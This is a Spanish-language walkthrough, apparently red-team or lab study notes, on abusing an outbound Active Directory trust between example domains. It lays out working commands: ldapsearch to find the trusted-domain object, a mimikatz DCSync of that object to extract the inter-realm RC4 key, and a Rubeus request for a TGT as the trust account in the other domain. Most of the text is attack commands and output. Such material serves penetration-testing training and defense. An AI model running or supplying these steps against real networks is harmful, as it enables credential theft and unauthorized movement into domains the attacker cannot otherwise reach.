#### 🔀 Outbound Trusts (confianza de salida)

Estamos en el lado **equivocado** de la confianza. Por diseño **no podemos acceder** a recursos del dominio trusted.

```
┌─────────────────────────────────────────────────────────┐
│  phoenix.com (trusting)  ←←←←←←←  dragon.com (trusted)  │
│                                                         │
│  dragon puede acceder a recursos de phoenix  +          │
│  phoenix NO puede acceder a recursos de dragon x        │
│                          ↑ aquí estamos nosotros        │
└─────────────────────────────────────────────────────────┘
```

```
ldapsearch (objectClass=trustedDomain)

name:           dragon.com
trustDirection: 2          ← outbound
trustAttributes: 8         ← external trust
flatName:       DRAGON
```

Intentar enumerar el dominio trusted falla:

```
ldapsearch (objectClass=domain) --hostname dragon.com
[-] Bind Failed: 49   ← invalid credentials
```

---

#### 🔑 La solución: extraer la inter-realm key del TDO

**Paso 1:** Obtener el objectGUID del TDO:

```
ldapsearch (objectClass=trustedDomain) --attributes name,objectGUID

name:       dragon.com
objectGUID: {a1b2c3d4-e5f6-7890-abcd-ef1234567890}
```

**Paso 2:** DCSync del TDO usando el GUID:

```
mimikatz lsadump::dcsync /domain:phoenix.com
                         /guid:{a1b2c3d4-e5f6-7890-abcd-ef1234567890}

 [ Out ]   DRAGON.COM -> PHOENIX.COM  ← clave actual
 [ Out-1 ] DRAGON.COM -> PHOENIX.COM  ← clave anterior
    * rc4_hmac_nt: [inter-realm key]
```

```
┌─────────────────────────────────────────────────────────┐
│  [Out] y [Out-1] son iguales si no han pasado           │
│  30 días desde que se creó la confianza                 │
└─────────────────────────────────────────────────────────┘
```

**Paso 3:** Pedir TGT en dragon.com como la trust account PHOENIX$:

```
Rubeus.exe asktgt
  /user:PHOENIX$              ← trust account en dragon.com
  /domain:DRAGON.COM          ← dominio trusted
  /dc:dc.dragon.com           ← DC del dominio trusted
  /rc4:[inter-realm key]      ← extraída del TDO
  /nowrap
```
